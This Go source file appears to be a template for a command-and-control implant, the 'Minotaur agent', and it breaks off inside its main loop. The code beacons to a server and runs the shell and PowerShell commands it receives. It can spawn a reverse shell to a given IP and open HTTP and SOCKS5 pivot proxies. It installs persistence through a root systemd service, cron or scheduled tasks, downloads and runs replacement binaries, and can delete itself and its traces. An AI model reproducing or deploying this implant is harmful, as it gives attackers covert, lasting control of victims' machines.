package main

import (
	"bytes"
	"context"
	crypto_rand "crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

type Config struct {
	ServerURL       string
	BeaconDelay     time.Duration
	Jitter          time.Duration
	UserAgent       string
	InsecureTLS     bool
	AutoPersistence bool
	DebugMode       bool
}

var config = Config{
	ServerURL:       "{{ .C2URL }}",
	BeaconDelay:     {{ .BeaconDelay }} * time.Second,
	Jitter:          {{ .Jitter }} * time.Second,
	UserAgent:       "{{ .UserAgent }}",
	InsecureTLS:     {{ .InsecureTLS }},
	AutoPersistence: {{ .AutoPersistence }},
	DebugMode:       {{ .DebugMode }},
}

var agentID string
var client *http.Client
var startTime = time.Now()
var runningProxies = make(map[string]context.CancelFunc)
var proxiesMu sync.Mutex

type AgentInfo struct {
	ID       string `json:"id"`
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
	IP       string `json:"ip"`
	Arch     string `json:"arch"`
	Version  string `json:"version"`
	Platform string `json:"platform"`
}

type Command struct {
	ID      string            `json:"id"`
	Type    string            `json:"type"`
	Payload map[string]string `json:"payload"`
}

type CommandResult struct {
	CommandID string `json:"command_id"`
	Output    string `json:"output"`
	Error     string `json:"error"`
}

const agentVersion = "{{ .AgentVersion }}"
const enableAuth = {{ .EnableAuth }}
const serverPublicKey = `{{ .ServerPublicKey }}`

var releaseSingletonLock func()

func init() {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: config.InsecureTLS},
	}
	client = &http.Client{Transport: tr, Timeout: 30 * time.Second}
}

func logf(format string, args ...interface{}) {
	if config.DebugMode {
		fmt.Printf("[MINOTAUR] "+format+"\n", args...)
		f, err := os.OpenFile(os.TempDir()+"/minotaur_agent.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err == nil {
			defer f.Close()
			fmt.Fprintf(f, "[MINOTAUR] "+format+"\n", args...)
		}
	}
}

func acquireSingletonLock() (func(), bool) {
	if runtime.GOOS == "windows" {
		return acquireLockWindows()
	}
	return acquireLockUnix()
}

func acquireLockWindows() (func(), bool) {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	createMutex := kernel32.NewProc("CreateMutexW")
	getLastError := kernel32.NewProc("GetLastError")

	mutexName, _ := syscall.UTF16PtrFromString("Global\\MinotaurAgentLock")
	handle, _, _ := createMutex.Call(0, 0, uintptr(unsafe.Pointer(mutexName)))
	if handle == 0 {
		return nil, false
	}
	errCode, _, _ := getLastError.Call()
	if errCode == 183 {
		syscall.CloseHandle(syscall.Handle(handle))
		return nil, false
	}
	release := func() {
		syscall.CloseHandle(syscall.Handle(handle))
	}
	return release, true
}

func acquireLockUnix() (func(), bool) {
	addr := &net.UnixAddr{Name: "\x00minotaur_agent_lock", Net: "unix"}
	ln, err := net.ListenUnix("unix", addr)
	if err != nil {
		return nil, false
	}
	release := func() {
		ln.Close()
	}
	return release, true
}

func updateScriptInProgress() bool {
	exePath, err := os.Executable()
	if err != nil {
		return false
	}
	dir := filepath.Dir(exePath)
	if runtime.GOOS == "windows" {
		if _, err := os.Stat(filepath.Join(dir, "minotaur_update.bat")); err == nil {
			return true
		}
	} else {
		if _, err := os.Stat(filepath.Join(dir, "minotaur_update.sh")); err == nil {
			return true
		}
	}
	return false
}

func getHostname() string {
	name, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return name
}

func getOutboundIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "unknown"
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	return localAddr.IP.String()
}

func authenticate() error {
	if !enableAuth {
		return nil
	}
	block, _ := pem.Decode([]byte(serverPublicKey))
	if block == nil {
		return fmt.Errorf("failed to parse public key")
	}
	pub, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return err
	}
	rsaPub, ok := pub.(*rsa.PublicKey)
	if !ok {
		return fmt.Errorf("not RSA public key")
	}
	challenge := make([]byte, 32)
	_, err = crypto_rand.Read(challenge)
	if err != nil {
		return err
	}
	encrypted, err := rsa.EncryptPKCS1v15(crypto_rand.Reader, rsaPub, challenge)
	if err != nil {
		return err
	}
	payload := map[string]string{
		"version":   agentVersion,
		"platform":  runtime.GOOS + "/" + runtime.GOARCH,
		"challenge": base64.StdEncoding.EncodeToString(encrypted),
	}
	jsonData, _ := json.Marshal(payload)
	resp, err := client.Post(config.ServerURL+"/api/agent/authenticate", "application/json", bytes.NewReader(jsonData))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return fmt.Errorf("authentication failed: %d", resp.StatusCode)
	}
	var result map[string]string
	err = json.NewDecoder(resp.Body).Decode(&result)
	if err != nil {
		return err
	}
	decryptedB64 := result["challenge"]
	decrypted, err := base64.StdEncoding.DecodeString(decryptedB64)
	if err != nil {
		return err
	}
	if !bytes.Equal(decrypted, challenge) {
		return fmt.Errorf("challenge mismatch")
	}
	return nil
}

func register() {
	info := AgentInfo{
		Hostname: getHostname(),
		OS:       runtime.GOOS,
		IP:       getOutboundIP(),
		Arch:     runtime.GOARCH,
		Version:  agentVersion,
		Platform: runtime.GOOS + "/" + runtime.GOARCH,
	}
	jsonData, _ := json.Marshal(info)
	req, err := http.NewRequest("POST", config.ServerURL+"/api/agent/register", bytes.NewBuffer(jsonData))
	if err != nil {
		logf("Register request creation error: %v", err)
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", config.UserAgent)

	resp, err := client.Do(req)
	if err != nil {
		logf("Register error: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		var result map[string]string
		json.NewDecoder(resp.Body).Decode(&result)
		agentID = result["agent_id"]
		logf("Registered successfully with ID: %s", agentID)
	} else {
		logf("Registration failed, HTTP status: %d", resp.StatusCode)
	}
}

func beacon() ([]Command, error) {
	info := AgentInfo{
		ID:       agentID,
		Version:  agentVersion,
		Platform: runtime.GOOS + "/" + runtime.GOARCH,
	}
	jsonData, _ := json.Marshal(info)
	req, err := http.NewRequest("POST", config.ServerURL+"/api/agent/beacon", bytes.NewBuffer(jsonData))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", config.UserAgent)

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("beacon failed, status: %d", resp.StatusCode)
	}

	var commands []Command
	err = json.NewDecoder(resp.Body).Decode(&commands)
	if config.DebugMode {
		logf("Beacon returned %d command(s)", len(commands))
	}
	return commands, err
}

func executeCommand(cmdStr string) (string, string) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", cmdStr)
	} else {
		cmd = exec.Command("/bin/sh", "-c", cmdStr)
	}
	stdout, err := cmd.Output()
	if err != nil {
		return "", err.Error()
	}
	return string(stdout), ""
}

func sendResult(result CommandResult) error {
	jsonData, _ := json.Marshal(result)
	req, err := http.NewRequest("POST", config.ServerURL+"/api/agent/result", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", config.UserAgent)
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if config.DebugMode {
		logf("Sent result for command %s", result.CommandID)
	}
	return nil
}

func doHelp() string {
	return `Available commands:
help, checkin, health, proc, net, shell, powershell, persistence, proxy, proxy_stop, socks, shell-reverse, schedule, update, restart, delete/exit`
}

func doCheckin() string {
	return fmt.Sprintf("Agent %s is active, version %s, last beacon: %s", agentID, agentVersion, time.Now().Format(time.RFC3339))
}

func doHealth() string {
	info := fmt.Sprintf("Agent %s is running, version %s, uptime: %s", agentID, agentVersion, time.Since(startTime).String())
	crashLogPath := filepath.Join(os.TempDir(), "minotaur_crash.log")
	if data, err := os.ReadFile(crashLogPath); err == nil && len(data) > 0 {
		info += "\n--- Last crash log ---\n" + string(data)
		os.Remove(crashLogPath)
	}
	return info
}

func doConfig(setting, value string) string {
	return fmt.Sprintf("Configuration changed: %s = %s (not persisted across restarts)", setting, value)
}

func doProcList() string {
	var out, errMsg string
	if runtime.GOOS == "windows" {
		out, errMsg = executeCommand("tasklist")
	} else {
		out, errMsg = executeCommand("ps aux")
	}
	if errMsg != "" {
		return "Error: " + errMsg
	}
	return out
}

func doNetEnum() string {
	var result string
	if runtime.GOOS == "windows" {
		ipconfig, _ := executeCommand("ipconfig")
		netstat, _ := executeCommand("netstat -an")
		result = "=== IP Configuration ===\n" + ipconfig + "\n=== Active Connections ===\n" + netstat
	} else {
		ifconfig, _ := executeCommand("ip a")
		netstat, _ := executeCommand("ss -tuln")
		result = "=== Network Interfaces ===\n" + ifconfig + "\n=== Listening Ports ===\n" + netstat
	}
	return result
}

func doShellCommand(cmdStr string) string {
	output, errMsg := executeCommand(cmdStr)
	if errMsg != "" {
		return "Error: " + errMsg
	}
	return output
}

func doPowershell(cmdStr string) string {
	if runtime.GOOS != "windows" {
		return "PowerShell is only available on Windows"
	}
	cmd := exec.Command("powershell", "-NoP", "-NonI", "-Command", cmdStr)
	stdout, err := cmd.Output()
	if err != nil {
		return err.Error()
	}
	return string(stdout)
}

func setupPersistence() (string, error) {
	exePath, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("failed to get executable path: %v", err)
	}
	absPath, err := filepath.Abs(exePath)
	if err != nil {
		return "", fmt.Errorf("failed to resolve absolute path: %v", err)
	}

	if runtime.GOOS == "linux" {
		serviceContent := fmt.Sprintf(`[Unit]
Description=Minotaur Agent
After=network.target

[Service]
ExecStart=%s
Restart=always
User=root
RestartSec=30

[Install]
WantedBy=multi-user.target`, absPath)

		servicePath := "/etc/systemd/system/minotaur-agent.service"
		if err := os.WriteFile(servicePath, []byte(serviceContent), 0644); err != nil {
			logf("Failed to write systemd service: %v", err)
		} else {
			exec.Command("systemctl", "daemon-reload").Run()
			exec.Command("systemctl", "enable", "minotaur-agent.service").Run()
			exec.Command("systemctl", "start", "minotaur-agent.service").Run()
			return "systemd", nil
		}

		logf("Systemd failed, falling back to crontab")
		cronCmd := fmt.Sprintf("@reboot %s > /dev/null 2>&1 &", absPath)
		cmd := exec.Command("bash", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronCmd))
		if err := cmd.Run(); err != nil {
			return "", fmt.Errorf("crontab fallback failed: %v", err)
		}
		return "crontab", nil
	}

	if runtime.GOOS == "windows" {
		cmd := exec.Command("schtasks", "/create", "/tn", "MinotaurAgent", "/tr", absPath, "/sc", "minute", "/mo", "5", "/f")
		if err := cmd.Run(); err != nil {
			return "", err
		}
		return "schtasks", nil
	}

	return "", fmt.Errorf("unsupported OS for persistence")
}

func startProxy(port string) {
	addr := "0.0.0.0:" + port
	ctx, cancel := context.WithCancel(context.Background())
	proxiesMu.Lock()
	runningProxies[port] = cancel
	proxiesMu.Unlock()

	server := &http.Server{
		Addr: addr,
		Handler: http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if r.Method == http.MethodConnect {
				destConn, err := net.Dial("tcp", r.Host)
				if err != nil {
					http.Error(w, err.Error(), http.StatusServiceUnavailable)
					return
				}
				w.WriteHeader(http.StatusOK)
				hijacker, ok := w.(http.Hijacker)
				if !ok {
					http.Error(w, "Hijacking not supported", http.StatusInternalServerError)
					return
				}
				clientConn, _, err := hijacker.Hijack()
				if err != nil {
					http.Error(w, err.Error(), http.StatusServiceUnavailable)
					return
				}
				go transfer(destConn, clientConn)
				go transfer(clientConn, destConn)
			} else {
				transport := &http.Transport{}
				resp, err := transport.RoundTrip(r)
				if err != nil {
					http.Error(w, err.Error(), http.StatusBadGateway)
					return
				}
				defer resp.Body.Close()
				for k, v := range resp.Header {
					w.Header()[k] = v
				}
				w.WriteHeader(resp.StatusCode)
				io.Copy(w, resp.Body)
			}
		}),
	}

	go func() {
		logf("HTTP proxy listening on %s", addr)
		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			logf("Proxy error: %v", err)
		}
	}()

	<-ctx.Done()
	server.Close()
	logf("HTTP proxy on port %s stopped", port)
}

func transfer(destination io.WriteCloser, source io.ReadCloser) {
	defer destination.Close()
	defer source.Close()
	io.Copy(destination, source)
}

func spawnReverseShell(ip, port string) {
	conn, err := net.Dial("tcp", ip+":"+port)
	if err != nil {
		logf("Reverse shell connection failed: %v", err)
		return
	}
	defer conn.Close()
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe")
	} else {
		cmd = exec.Command("/bin/sh")
	}
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

func startSocks5(port string) {
	addr := "0.0.0.0:" + port
	ctx, cancel := context.WithCancel(context.Background())
	proxiesMu.Lock()
	runningProxies[port] = cancel
	proxiesMu.Unlock()

	l, err := net.Listen("tcp", addr)
	if err != nil {
		logf("SOCKS5 listen error: %v", err)
		return
	}
	defer l.Close()
	logf("SOCKS5 proxy listening on %s", addr)

	go func() {
		<-ctx.Done()
		l.Close()
		logf("SOCKS5 proxy on port %s stopped", port)
	}()

	for {
		conn, err := l.Accept()
		if err != nil {
			return
		}
		go handleSocks5(conn)
	}
}

func handleSocks5(client net.Conn) {
	defer client.Close()

	buf := make([]byte, 256)
	n, err := client.Read(buf)
	if err != nil {
		return
	}
	if n < 2 || buf[0] != 0x05 {
		return
	}
	client.Write([]byte{0x05, 0x00})

	n, err = client.Read(buf)
	if err != nil {
		return
	}
	if n < 10 || buf[0] != 0x05 || buf[1] != 0x01 {
		return
	}
	var targetAddr string
	switch buf[3] {
	case 0x01:
		targetAddr = net.IP(buf[4:8]).String()
	case 0x03:
		domainLen := int(buf[4])
		if domainLen+5 > n {
			return
		}
		targetAddr = string(buf[5 : 5+domainLen])
	default:
		return
	}
	port := int(buf[len(buf)-2])<<8 | int(buf[len(buf)-1])
	target := fmt.Sprintf("%s:%d", targetAddr, port)

	targetConn, err := net.Dial("tcp", target)
	if err != nil {
		client.Write([]byte{0x05, 0x01, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}
	defer targetConn.Close()

	client.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0})

	go func() { io.Copy(client, targetConn) }()
	io.Copy(targetConn, client)
}

func doProxyStop(port string) string {
	proxiesMu.Lock()
	defer proxiesMu.Unlock()
	if port == "" || port == "all" {
		var stopped []string
		for p, cancel := range runningProxies {
			cancel()
			delete(runningProxies, p)
			stopped = append(stopped, p)
		}
		if len(stopped) == 0 {
			return "No active proxies to stop"
		}
		return "Stopped proxies on ports: " + strings.Join(stopped, ", ")
	}
	cancel, ok := runningProxies[port]
	if !ok {
		return "No proxy found on port " + port
	}
	cancel()
	delete(runningProxies, port)
	return "Stopped proxy on port " + port
}

func doRestart(delay, message string) string {
	if runtime.GOOS == "windows" {
		if delay == "" {
			delay = "0"
		}
		cmd := exec.Command("shutdown", "/r", "/f", "/t", delay)
		if message != "" {
			cmd.Args = append(cmd.Args, "/c", message)
		}
		if err := cmd.Run(); err != nil {
			return fmt.Sprintf("Restart failed: %v", err)
		}
		return fmt.Sprintf("System restart scheduled in %s seconds", delay)
	} else if runtime.GOOS == "linux" || runtime.GOOS == "darwin" {
		if delay == "" {
			delay = "0"
		}
		var cmd *exec.Cmd
		if runtime.GOOS == "darwin" {
			cmd = exec.Command("shutdown", "-r", "now")
		} else {
			if delay == "0" {
				cmd = exec.Command("shutdown", "-r", "now")
			} else {
				cmd = exec.Command("shutdown", "-r", "+"+delay)
			}
		}
		if err := cmd.Run(); err != nil {
			return fmt.Sprintf("Restart failed: %v", err)
		}
		if delay == "0" {
			return "System restart initiated"
		}
		return fmt.Sprintf("System restart scheduled in %s minutes", delay)
	} else {
		return "Unsupported OS"
	}
}

func doSchedule(action, name, schedule, command string) string {
	if runtime.GOOS == "windows" {
		return doScheduleWindows(action, name, schedule, command)
	}
	return doScheduleUnix(action, name, schedule, command)
}

func doScheduleWindows(action, name, schedule, command string) string {
	name = "Minotaur_" + name
	switch action {
	case "add":
		var cmd *exec.Cmd
		if schedule == "once" {
			parts := strings.SplitN(schedule, " ", 2)
			if len(parts) != 2 {
				return "Invalid once schedule. Use: once YYYY-MM-DD HH:MM"
			}
			cmd = exec.Command("schtasks", "/create", "/tn", name, "/tr", command, "/sc", "once", "/st", parts[1], "/sd", parts[0], "/f")
		} else if strings.HasPrefix(schedule, "daily") {
			parts := strings.SplitN(schedule, " ", 2)
			if len(parts) != 2 {
				return "Invalid daily schedule. Use: daily HH:MM"
			}
			cmd = exec.Command("schtasks", "/create", "/tn", name, "/tr", command, "/sc", "daily", "/st", parts[1], "/f")
		} else if schedule == "hourly" {
			cmd = exec.Command("schtasks", "/create", "/tn", name, "/tr", command, "/sc", "hourly", "/f")
		} else if strings.HasPrefix(schedule, "minute") {
			parts := strings.SplitN(schedule, " ", 2)
			if len(parts) != 2 {
				return "Invalid minute schedule. Use: minute N (N minutes)"
			}
			minutes := parts[1]
			cmd = exec.Command("schtasks", "/create", "/tn", name, "/tr", command, "/sc", "minute", "/mo", minutes, "/f")
		} else {
			return "Unsupported schedule format"
		}
		out, err := cmd.CombinedOutput()
		if err != nil {
			return fmt.Sprintf("Failed to create task: %v - %s", err, string(out))
		}
		return "Task created: " + name
	case "list":
		cmd := exec.Command("schtasks", "/query", "/tn", name, "/fo", "csv")
		out, err := cmd.Output()
		if err != nil {
			return "No tasks found or error: " + err.Error()
		}
		return string(out)
	case "remove":
		cmd := exec.Command("schtasks", "/delete", "/tn", name, "/f")
		out, err := cmd.CombinedOutput()
		if err != nil {
			return fmt.Sprintf("Failed to delete task: %v - %s", err, string(out))
		}
		return "Task deleted: " + name
	default:
		return "Unknown action. Use add, list, remove"
	}
}

func doScheduleUnix(action, name, schedule, command string) string {
	prefix := "# MinotaurAgent: " + name
	crontabPath := filepath.Join(os.TempDir(), "minotaur_crontab")
	switch action {
	case "add":
		var cronLine string
		if strings.Contains(schedule, " ") && !strings.Contains(schedule, "*") {
			cronLine = schedule + " " + command
		} else if strings.HasPrefix(schedule, "daily") {
			parts := strings.SplitN(schedule, " ", 2)
			if len(parts) != 2 {
				return "Invalid daily schedule. Use: daily HH:MM"
			}
			hourMin := parts[1]
			hour := strings.Split(hourMin, ":")[0]
			minute := strings.Split(hourMin, ":")[1]
			cronLine = fmt.Sprintf("%s %s * * * %s", minute, hour, command)
		} else if schedule == "hourly" {
			cronLine = fmt.Sprintf("0 * * * * %s", command)
		} else {
			return "Unsupported schedule format. Use cron syntax or 'daily HH:MM' or 'hourly'"
		}
		cmd := exec.Command("crontab", "-l")
		out, _ := cmd.Output()
		current := string(out)
		if strings.Contains(current, prefix) {
			return "Task already exists"
		}
		newCron := current + "\n" + prefix + "\n" + cronLine + "\n"
		err := os.WriteFile(crontabPath, []byte(newCron), 0600)
		if err != nil {
			return "Failed to write temp crontab: " + err.Error()
		}
		cmd = exec.Command("crontab", crontabPath)
		if err := cmd.Run(); err != nil {
			return "Failed to install crontab: " + err.Error()
		}
		os.Remove(crontabPath)
		return "Cron job added: " + cronLine
	case "list":
		cmd := exec.Command("crontab", "-l")
		out, err := cmd.Output()
		if err != nil {
			return "No crontab or error: " + err.Error()
		}
		lines := strings.Split(string(out), "\n")
		var result []string
		for i, line := range lines {
			if strings.Contains(line, prefix) && i+1 < len(lines) {
				result = append(result, lines[i+1])
			}
		}
		if len(result) == 0 {
			return "No scheduled tasks found"
		}
		return strings.Join(result, "\n")
	case "remove":
		cmd := exec.Command("crontab", "-l")
		out, err := cmd.Output()
		if err != nil {
			return "No crontab to modify"
		}
		lines := strings.Split(string(out), "\n")
		var newLines []string
		skip := false
		for _, line := range lines {
			if strings.Contains(line, prefix) {
				skip = true
				continue
			}
			if skip && line == "" {
				skip = false
				continue
			}
			if !skip {
				newLines = append(newLines, line)
			}
		}
		newCron := strings.Join(newLines, "\n")
		err = os.WriteFile(crontabPath, []byte(newCron), 0600)
		if err != nil {
			return "Failed to write temp crontab: " + err.Error()
		}
		cmd = exec.Command("crontab", crontabPath)
		if err := cmd.Run(); err != nil {
			return "Failed to install updated crontab: " + err.Error()
		}
		os.Remove(crontabPath)
		return "Task removed: " + name
	default:
		return "Unknown action. Use add, list, remove"
	}
}

func selfUpdate(downloadURL string, newVersion string) error {
	logf("Starting self‑update to version %s from %s", newVersion, downloadURL)

	exePath, err := os.Executable()
	if err != nil {
		return err
	}
	exeDir := filepath.Dir(exePath)
	exeName := filepath.Base(exePath)

	resp, err := client.Get(downloadURL)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	tmpFile, err := os.CreateTemp(exeDir, "minotaur_update_")
	if err != nil {
		return err
	}
	_, err = io.Copy(tmpFile, resp.Body)
	if err != nil {
		tmpFile.Close()
		os.Remove(tmpFile.Name())
		return err
	}
	tmpFile.Close()

	newExePath := filepath.Join(exeDir, exeName+".new")
	os.Remove(newExePath)
	if err := os.Rename(tmpFile.Name(), newExePath); err != nil {
		return fmt.Errorf("failed to move new binary into place: %w", err)
	}
	if runtime.GOOS != "windows" {
		os.Chmod(newExePath, 0755)
	}

	var scriptPath string
	var scriptContent string
	if runtime.GOOS == "windows" {
		scriptPath = filepath.Join(exeDir, "minotaur_update.bat")
		scriptContent = fmt.Sprintf(`@echo off
timeout /t 2 /nobreak > nul
:retry
del /f /q "%s" 2> nul
if exist "%s" goto retry
move /y "%s" "%s"
start "" "%s"
del /f /q "%%~f0"
`, exePath, exePath, newExePath, exePath, exePath)
	} else {
		scriptPath = filepath.Join(exeDir, "minotaur_update.sh")
		scriptContent = fmt.Sprintf(`#!/bin/sh
sleep 2
rm -f "%s"
mv "%s" "%s"
chmod +x "%s"
"%s" &
rm -f "$0"
`, exePath, newExePath, exePath, exePath, exePath)
	}

	if err := os.WriteFile(scriptPath, []byte(scriptContent), 0700); err != nil {
		return fmt.Errorf("failed to write update script: %w", err)
	}

	var scriptCmd *exec.Cmd
	if runtime.GOOS == "windows" {
		scriptCmd = exec.Command("cmd", "/c", scriptPath)
	} else {
		scriptCmd = exec.Command("/bin/sh", scriptPath)
	}
	scriptCmd.SysProcAttr = &syscall.SysProcAttr{
		CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP,
	}
	if err := scriptCmd.Start(); err != nil {
		return fmt.Errorf("failed to start update script: %w", err)
	}

	os.Exit(0)
	return nil
}

func selfDestruct() {
	logf("Self‑destruct initiated")
	if runtime.GOOS == "windows" {
		exec.Command("schtasks", "/delete", "/tn", "MinotaurAgent", "/f").Run()
	} else if runtime.GOOS == "linux" {
		exec.Command("systemctl", "stop", "minotaur-agent.service").Run()
		exec.Command("systemctl", "disable", "minotaur-agent.service").Run()
		os.Remove("/etc/systemd/system/minotaur-agent.service")
		exec.Command("systemctl", "daemon-reload").Run()
		exec.Command("bash", "-c", "crontab -l | grep -v 'minotaur_agent' | crontab -").Run()
	}
	exePath, _ := os.Executable()
	if exePath == "" {
		exePath = os.Args[0]
	}
	if runtime.GOOS == "windows" {
		batchContent := fmt.Sprintf("@echo off\ntimeout /t 2 /nobreak > nul\ndel /f /q \"%s\"\ndel /f /q \"%%~f0\"", exePath)
		batchPath := filepath.Join(os.TempDir(), "minotaur_cleanup.bat")
		os.WriteFile(batchPath, []byte(batchContent), 0700)
		exec.Command("cmd", "/c", batchPath).Start()
	} else {
		scriptContent := fmt.Sprintf("#!/bin/sh\nsleep 2\nrm -f \"%s\"\nrm -f \"$0\"", exePath)
		scriptPath := filepath.Join(os.TempDir(), "minotaur_cleanup.sh")
		os.WriteFile(scriptPath, []byte(scriptContent), 0700)
		exec.Command("/bin/sh", scriptPath).Start()
	}
	os.Exit(0)
}

func processCommand(cmd Command) {
	if config.DebugMode {
		logf("Processing command: type=%s, payload=%v", cmd.Type, cmd.Payload)
	}
	switch cmd.Type {
	case "exec":
		output, errMsg := executeCommand(cmd.Payload["command"])
		sendResult(CommandResult{CommandID: cmd.ID, Output: output, Error: errMsg})
	case "help":
		sendResult(CommandResult{CommandID: cmd.ID, Output: doHelp(), Error: ""})
	case "checkin":
		output := doCheckin()
		sendResult(CommandResult{CommandID: cmd.ID, Output: output, Error: ""})
	case "health":
		output := doHealth()
		sendResult(CommandResult{CommandID: cmd.ID, Output: output, Error: ""})
	case "config":
		output := doConfig(cmd.Payload["setting"], cmd.Payload["value"])
		sendResult(CommandResult{CommandID: cmd.ID, Output: output, Error: ""})
	case "proc":
		sendResult(CommandResult{CommandID: cmd.ID, Output: doProcList(), Error: ""})
	case "net":
		sendResult(CommandResult{CommandID: cmd.ID, Output: doNetEnum(), Error: ""})
	case "shell":
		sendResult(CommandResult{CommandID: cmd.ID, Output: doShellCommand(cmd.Payload["command"]), Error: ""})
	case "powershell":
		sendResult(CommandResult{CommandID: cmd.ID, Output: doPowershell(cmd.Payload["command"]), Error: ""})
	case "persistence":
		method, err := setupPersistence()
		if err != nil {
			sendResult(CommandResult{CommandID: cmd.ID, Error: err.Error()})
		} else {
			sendResult(CommandResult{CommandID: cmd.ID, Output: "Persistence installed using " + method})
		}
	case "proxy":
		port := cmd.Payload["port"]
		go startProxy(port)
		sendResult(CommandResult{CommandID: cmd.ID, Output: "HTTP proxy started on port " + port, Error: ""})
	case "proxy_stop":
		port := cmd.Payload["port"]
		output := doProxyStop(port)
		sendResult(CommandResult{CommandID: cmd.ID, Output: output, Error: ""})
	case "socks":
		port := cmd.Payload["port"]
		go startSocks5(port)
		sendResult(CommandResult{CommandID: cmd.ID, Output: "SOCKS5 proxy started on port " + port, Error: ""})
	case "shell-reverse":
		ip := cmd.Payload["ip"]
		port := cmd.Payload["port"]
		go spawnReverseShell(ip, port)
		sendResult(CommandResult{CommandID: cmd.ID, Output: "Reverse shell spawning", Error: ""})
	case "schedule":
		action := cmd.Payload["action"]
		name := cmd.Payload["name"]
		schedule := cmd.Payload["schedule"]
		command := cmd.Payload["command"]
		output := doSchedule(action, name, schedule, command)
		sendResult(CommandResult{CommandID: cmd.ID, Output: output, Error: ""})
	case "update":
		url := cmd.Payload["url"]
		newVersion := cmd.Payload["version"]
		err := selfUpdate(url, newVersion)
		if err != nil {
			sendResult(CommandResult{CommandID: cmd.ID, Error: err.Error()})
		}
	case "restart":
		delay := cmd.Payload["delay"]
		msg := cmd.Payload["message"]
		output := doRestart(delay, msg)
		sendResult(CommandResult{CommandID: cmd.ID, Output: output, Error: ""})
	case "delete", "exit":
		go selfDestruct()
		return
	default:
		output, errMsg := executeCommand(cmd.Type + " " + cmd.Payload["args"])
		sendResult(CommandResult{CommandID: cmd.ID, Output: output, Error: errMsg})
	}
}

func cleanupAllArtifacts() {
	exePath, _ := os.Executable()
	if exePath != "" {
		dir := filepath.Dir(exePath)
		base := filepath.Base(exePath)
		os.Remove(filepath.Join(dir, base+".old"))
		os.Remove(filepath.Join(dir, base+".failed"))
		os.Remove(filepath.Join(dir, base+".new"))
		matches, _ := filepath.Glob(filepath.Join(dir, "*.old"))
		for _, m := range matches {
			os.Remove(m)
		}
		matches, _ = filepath.Glob(filepath.Join(dir, "*.failed"))
		for _, m := range matches {
			os.Remove(m)
		}
		matches, _ = filepath.Glob(filepath.Join(dir, "*.new"))
		for _, m := range matches {
			os.Remove(m)
		}
		os.Remove(filepath.Join(dir, "minotaur_update.bat"))
		os.Remove(filepath.Join(dir, "minotaur_update.sh"))
	}

	if runtime.GOOS == "windows" {
		os.Remove(filepath.Join(os.TempDir(), "minotaur_update.bat"))
		os.Remove(filepath.Join(os.TempDir(), "minotaur_cleanup.bat"))
	} else {
		os.Remove(filepath.Join(os.TempDir(), "minotaur_update.sh"))
		os.Remove(filepath.Join(os.TempDir(), "minotaur_cleanup.sh"))
	}

	tmpMatches, _ := filepath.Glob(filepath.Join(os.TempDir(), "minotaur_update_*"))
	for _, m := range tmpMatches {
		os.Remove(m)
	}
}

func main() {
	if updateScriptInProgress() {
		os.Exit(0)
	}

	var ok bool
	releaseSingletonLock, ok = acquireSingletonLock()
	if !ok {
		os.Exit(0)
	}
	defer releaseSingletonLock()

	cleanupAllArtifacts()

	defer func() {
		if r := recover(); r != nil && !config.DebugMode {
			crashLog := fmt.Sprintf("Panic at %s: %v\n", time.Now().Format(time.RFC3339), r)
			os.WriteFile(filepath.Join(os.TempDir(), "minotaur_crash.log"), []byte(crashLog), 0644)
		}
	}()

	if config.DebugMode {
		fmt.Println("[MINOTAUR] Debug mode enabled – using fixed beacon timing")
	} else {
		logf("Randomised beacon delay will be applied each iteration (30–300s, jitter 0–60s)")
	}

	logf("Starting Minotaur agent version %s on %s/%s", agentVersion, runtime.GOOS, runtime.GOARCH)

	if err := authenticate(); err != nil {
		logf("Authentication failed: %v", err)
		time.Sleep(10 * time.Second)
		os.Exit(1)
	}
	logf("Server authenticated successfully")

	register()
	if agentID == "" {
		logf("Registration failed, exiting after 10 seconds")
		time.Sleep(10 * time.Second)
		return
	}

	if config.AutoPersistence {
		logf("Auto-persistence enabled, installing...")
		method, err := setupPersistence()
		if err != nil {
			logf("Auto-persistence failed: %v", err)
		} else {
			logf("Auto-persistence installed using %s", method)
		}
	}

	for {
		var sleepDuration time.Duration
		if config.DebugMode {
			jitter := time.Duration(0)
			if config.Jitter > 0 {
				jitter = time.Duration(time.Now().UnixNano() % int64(config.Jitter))
			}
			sleepDuration = config.BeaconDelay + jitter
		} else {
			minDelay := 30
			maxDelay := 300
